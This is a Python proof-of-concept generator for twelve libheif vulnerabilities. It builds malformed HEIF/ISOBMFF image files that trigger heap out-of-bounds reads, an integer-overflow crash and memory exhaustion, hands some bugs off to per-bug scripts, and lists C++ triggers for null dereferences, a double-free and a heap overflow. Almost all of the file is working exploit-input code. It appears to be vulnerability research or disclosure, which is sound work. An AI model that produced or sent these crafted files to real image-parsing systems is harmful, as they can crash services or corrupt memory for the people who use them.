#!/usr/bin/env python3
"""
Master POC generator for libheif validated vulnerabilities.

Usage:
    python3 gen_pocs.py               # regenerate all file-based POC inputs in-place
    python3 gen_pocs.py --list        # list all bugs and their POC type
    python3 gen_pocs.py --bug 04      # regenerate a single bug's POC

File-based POCs (generated here or delegated to per-bug gen_poc.py):
    01, 04, 05, 06, 12

C++ POCs (must be compiled; see each bug's build.sh):
    02, 03, 07, 08, 09, 10, 11
"""

import struct
import sys
import os
import subprocess
import argparse

HERE = os.path.dirname(os.path.abspath(__file__))


# ---------------------------------------------------------------------------
# Shared ISOBMFF helpers
# ---------------------------------------------------------------------------

def box(fourcc, data=b''):
    if isinstance(fourcc, str):
        fourcc = fourcc.encode()
    return struct.pack('>I4s', 8 + len(data), fourcc) + data

def full_box(fourcc, version, flags, data=b''):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return box(fourcc, hdr + data)

def make_ftyp(major=b'isom', minor=0, compat=(b'isom', b'iso2', b'mp41')):
    data = major + struct.pack('>I', minor)
    for c in compat:
        data += c
    return box('ftyp', data)

def make_ftyp_heic():
    """heic ftyp with isom compat brand — required for sequence parsing path."""
    data = b'heic' + struct.pack('>I', 0) + b'heicmif1isom'
    return box('ftyp', data)

def make_mvhd(timescale=1000, duration=1000):
    data  = struct.pack('>IIIII', 0, 0, timescale, duration, 0x00010000)
    data += struct.pack('>h', 0x0100) + b'\x00' * 10
    data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
    data += b'\x00' * 24 + struct.pack('>I', 2)
    return full_box('mvhd', 0, 0, data)

def make_tkhd(track_id=1, duration=1000, width=64, height=64, flags=3):
    data  = struct.pack('>IIIII', 0, 0, track_id, 0, duration)
    data += b'\x00' * 8 + struct.pack('>hh', 0, 0)
    data += struct.pack('>h', 0x0100) + b'\x00' * 2
    data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
    data += struct.pack('>II', width << 16, height << 16)
    return full_box('tkhd', 0, flags, data)

def make_mdhd(timescale=1000, duration=1000):
    data = struct.pack('>IIIII', 0, 0, timescale, duration, 0)
    data += struct.pack('>HH', 0x55C4, 0)
    return full_box('mdhd', 0, 0, data)

def make_hdlr(handler=b'vide', name=b'Video\x00'):
    data = struct.pack('>I', 0) + handler + b'\x00' * 12 + name
    return full_box('hdlr', 0, 0, data)

def make_vmhd():
    return full_box('vmhd', 0, 1, struct.pack('>HHHH', 0, 0, 0, 0))

def make_dinf():
    url  = full_box('url ', 0, 1, b'\x00')
    dref = full_box('dref', 0, 0, struct.pack('>I', 1) + url)
    return box('dinf', dref)

def make_stsd_hvc1():
    e  = b'\x00' * 6 + struct.pack('>H', 1) + b'\x00' * 16
    e += struct.pack('>HH', 64, 64)
    e += struct.pack('>II', 0x00480000, 0x00480000) + b'\x00' * 4
    e += struct.pack('>H', 1) + b'\x00' * 32
    e += struct.pack('>Hh', 0x0018, -1)
    return full_box('stsd', 0, 0, struct.pack('>I', 1) + box('hvc1', e))

def make_stts(entries):
    data = struct.pack('>I', len(entries))
    for cnt, delta in entries:
        data += struct.pack('>II', cnt, delta)
    return full_box('stts', 0, 0, data)

def make_stsc(entries):
    data = struct.pack('>I', len(entries))
    for fc, spc, sdi in entries:
        data += struct.pack('>III', fc, spc, sdi)
    return full_box('stsc', 0, 0, data)

def make_stco(offsets):
    data = struct.pack('>I', len(offsets))
    for o in offsets:
        data += struct.pack('>I', o)
    return full_box('stco', 0, 0, data)

def make_stsz(sample_size, count, sizes=None):
    data = struct.pack('>II', sample_size, count)
    if sample_size == 0 and sizes:
        for s in sizes:
            data += struct.pack('>I', s)
    return full_box('stsz', 0, 0, data)

def make_saiz(default_size, count, sizes=None, aux_type=0, aux_param=0):
    flags = 1 if aux_type else 0
    hdr   = struct.pack('>II', aux_type, aux_param) if aux_type else b''
    data  = hdr + struct.pack('>BI', default_size, count)
    if default_size == 0 and sizes:
        for s in sizes:
            data += struct.pack('>B', s)
    return full_box('saiz', 0, flags, data)

def make_saio(offsets, aux_type=0, aux_param=0):
    flags = 1 if aux_type else 0
    hdr   = struct.pack('>II', aux_type, aux_param) if aux_type else b''
    data  = hdr + struct.pack('>I', len(offsets))
    for o in offsets:
        data += struct.pack('>I', o)
    return full_box('saio', 0, flags, data)

def make_minf(stbl_data):
    return box('minf', make_vmhd() + make_dinf() + box('stbl', stbl_data))

def make_mdia(timescale, duration, stbl_data, handler=b'vide'):
    return box('mdia',
               make_mdhd(timescale, duration) +
               make_hdlr(handler) +
               make_minf(stbl_data))

def make_trak(track_id, duration, timescale, stbl_data, width=64, height=64):
    return box('trak',
               make_tkhd(track_id, duration, width, height) +
               make_mdia(timescale, duration, stbl_data))

def make_moov(timescale, duration, *traks):
    return box('moov', make_mvhd(timescale, duration) + b''.join(traks))


# ---------------------------------------------------------------------------
# Bug 01 — OOB chunk access in Track::get_next_sample_raw_data()
# stco has 2 chunks but stsz has 5 samples; orphaned samples get OOB chunkIdx
# ---------------------------------------------------------------------------
def gen_bug01():
    stbl = (make_stsd_hvc1() +
            make_stts([(5, 100)]) +
            make_stsc([(1, 1, 1)]) +
            make_stsz(4, 5) +
            make_stco([0x200, 0x220]))
    moov = make_moov(1000, 500, make_trak(1, 500, 1000, stbl))
    mdat = box('mdat', b'\x00\x00\x00\x04' * 5)
    return make_ftyp_heic() + mdat + moov


# ---------------------------------------------------------------------------
# Bug 04 — OOB in SampleAuxInfoReader via saiz sample count > stco chunks
# saiz declares 100 samples; only 5 real samples in 2 chunks → OOB at i=5
# ---------------------------------------------------------------------------
def gen_bug04():
    SUID = 0x73756964  # 'suid'
    stbl = (make_stsd_hvc1() +
            make_stts([(5, 100)]) +
            make_stsc([(1, 2, 1), (2, 3, 1)]) +
            make_stsz(0, 5, [4] * 5) +
            make_stco([0x200, 0x210]) +
            make_saiz(1, 100, aux_type=SUID) +
            make_saio([0x300, 0x310], aux_type=SUID))
    moov = make_moov(1000, 500, make_trak(1, 500, 1000, stbl))
    mdat = box('mdat', b'\x00' * 128)
    return make_ftyp_heic() + mdat + moov


# ---------------------------------------------------------------------------
# Bug 05 — Integer overflow in nTiles_h(): image_width=0xFFFFFFFE, tile_width=3
# 0xFFFFFFFE + 3 - 1 wraps to 0 in uint32_t → m_offsets.resize(0) → SIGSEGV
# (Delegate to per-bug gen_poc.py if it exists, else inline)
# ---------------------------------------------------------------------------
def gen_bug05():
    subdir = os.path.join(HERE, '05-tild-ntiles-overflow')
    gen    = os.path.join(subdir, 'gen_poc.py')
    poc    = os.path.join(subdir, 'poc_input')
    if os.path.exists(gen):
        subprocess.run([sys.executable, gen, poc], check=True)
        with open(poc, 'rb') as f:
            return f.read()
    # Inline fallback: minimal HEIF with tili item + tilC property
    # (image_width=0xFFFFFFFE, tile_width=3, codec=hvc1)
    raise RuntimeError("05-tild-ntiles-overflow/gen_poc.py not found; run build.sh manually")


# ---------------------------------------------------------------------------
# Bug 06 — NULL iloc deref: trak > meta has infe(uri) but no iloc
# ---------------------------------------------------------------------------
def gen_bug06():
    subdir = os.path.join(HERE, '06-track-null-iloc-deref')
    gen    = os.path.join(subdir, 'gen_poc.py')
    poc    = os.path.join(subdir, 'poc_input')
    if os.path.exists(gen):
        subprocess.run([sys.executable, gen, poc], check=True)
        with open(poc, 'rb') as f:
            return f.read()
    raise RuntimeError("06-track-null-iloc-deref/gen_poc.py not found; run build.sh manually")


# ---------------------------------------------------------------------------
# Bug 12 — Box_snuc memory exhaustion: width=2, height=117966856 → 1.88 GB
# ---------------------------------------------------------------------------
def gen_bug12():
    subdir = os.path.join(HERE, '12-snuc-memory-exhaustion')
    gen    = os.path.join(subdir, 'gen_poc.py')
    poc    = os.path.join(subdir, 'poc_input')
    if os.path.exists(gen):
        subprocess.run([sys.executable, gen, poc], check=True)
        with open(poc, 'rb') as f:
            return f.read()
    raise RuntimeError("12-snuc-memory-exhaustion/gen_poc.py not found; run build.sh manually")


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------

FILE_BUGS = {
    '01': ('01-track-oob-chunk-access',  'poc_input',  gen_bug01,
           'Heap OOB read — Track::get_next_sample_raw_data() (file parsing)'),
    '04': ('04-saiz-sampleauxinfo-oob',  'poc_input',  gen_bug04,
           'Heap OOB read — SampleAuxInfoReader constructor saiz/stco mismatch (file parsing)'),
    '05': ('05-tild-ntiles-overflow',    'poc_input',  gen_bug05,
           'Int overflow nTiles_h/v → empty m_offsets → SIGSEGV (file parsing)'),
    '06': ('06-track-null-iloc-deref',   'poc_input',  gen_bug06,
           'NULL iloc deref in Track::load() — trak>meta with infe(uri) but no iloc (file parsing)'),
    '12': ('12-snuc-memory-exhaustion',  'poc_input',  gen_bug12,
           'OOM bypass — Box_snuc::parse() two resize() calls evade MemoryHandle (file parsing)'),
}

CPP_BUGS = {
    '02': ('02-unci-empty-null-parameters',        ['poc_trigger.cc'],
           'NULL deref — heif_context_add_empty_unci_image(parameters=NULL)'),
    '03': ('03-gimi-component-id-overflow',        ['poc_trigger.cc'],
           'Int overflow → heap OOB write — heif_image_set_gimi_component_content_id(UINT32_MAX)'),
    '07': ('07-track-api-oob-no-size',             ['poc_07_get_track_ids.cc',
                                                    'poc_08_get_reference_types.cc'],
           'Heap buffer overflow — heif_context_get_track_ids / heif_track_get_track_reference_types (no size param)'),
    '08': ('08-track-release-double-free',         ['poc_trigger.cc'],
           'Double-free / UAF — heif_track_release() called twice'),
    '09': ('09-context-api-null-data',             ['poc_read_from_memory.cc',
                                                    'poc_add_metadata_null.cc'],
           'NULL deref — read_from_memory/add_generic_metadata with data=NULL, size>0'),
    '10': ('10-context-api-negative-size',         ['poc_trigger.cc'],
           'Signed→size_t wrap — add_generic_metadata/add_XMP_metadata with size=-1'),
    '11': ('11-metadata-invalid-compression-enum', ['poc_trigger.cc'],
           'UB + type confusion — heif_context_add_XMP_metadata2 with invalid compression enum'),
}


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def cmd_list():
    print("\n=== File-based POCs (auto-generated) ===")
    for num, (subdir, fname, _, desc) in sorted(FILE_BUGS.items()):
        path = os.path.join(HERE, subdir, fname)
        exists = '✓' if os.path.exists(path) else '✗'
        print(f"  [{exists}] {num}: {desc}")
        print(f"       {subdir}/{fname}")

    print("\n=== C++ POCs (compile via build.sh) ===")
    for num, (subdir, files, desc) in sorted(CPP_BUGS.items()):
        print(f"  {num}: {desc}")
        for f in files:
            path = os.path.join(HERE, subdir, f)
            exists = '✓' if os.path.exists(path) else '✗'
            print(f"       [{exists}] {subdir}/{f}")
    print()


def cmd_generate(bugs=None):
    targets = bugs if bugs else sorted(FILE_BUGS.keys())
    for num in targets:
        if num not in FILE_BUGS:
            if num in CPP_BUGS:
                subdir, files, desc = CPP_BUGS[num]
                print(f"[{num}] C++ POC — compile with: bash {subdir}/build.sh")
            else:
                print(f"[{num}] Unknown bug number")
            continue
        subdir, fname, gen_fn, desc = FILE_BUGS[num]
        out_path = os.path.join(HERE, subdir, fname)
        print(f"[{num}] Generating {subdir}/{fname} ... ", end='', flush=True)
        try:
            data = gen_fn()
            os.makedirs(os.path.dirname(out_path), exist_ok=True)
            with open(out_path, 'wb') as f:
                f.write(data)
            print(f"{len(data)} bytes  — {desc}")
        except Exception as e:
            print(f"FAILED: {e}")


def main():
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('--list', action='store_true',
                        help='List all bugs and POC status')
    parser.add_argument('--bug', metavar='N',
                        help='Regenerate a single bug number (e.g. --bug 04)')
    args = parser.parse_args()

    if args.list:
        cmd_list()
    elif args.bug:
        cmd_generate([args.bug.zfill(2)])
    else:
        print("Regenerating all file-based POC inputs...\n")
        cmd_generate()
        print("\nDone. For C++ POCs run: bash <bug-dir>/build.sh")


if __name__ == '__main__':
    main()
